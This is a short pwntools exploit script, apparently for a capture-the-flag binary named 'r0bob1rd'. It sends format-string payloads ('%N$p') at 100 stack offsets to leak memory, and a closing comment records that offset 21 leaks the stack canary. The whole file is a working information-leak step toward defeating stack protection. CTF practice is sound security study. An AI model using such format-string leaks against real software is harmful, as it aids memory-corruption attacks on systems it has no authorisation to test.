from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./r0bob1rd', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', '%{}$p'.format(i).encode())
        # Receive the response
        p.recvuntil(b"[Description]")
        p.recvline()
        result = p.recvline()
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass

# 0xc45a8f98691c6000
# %21$p is the canary 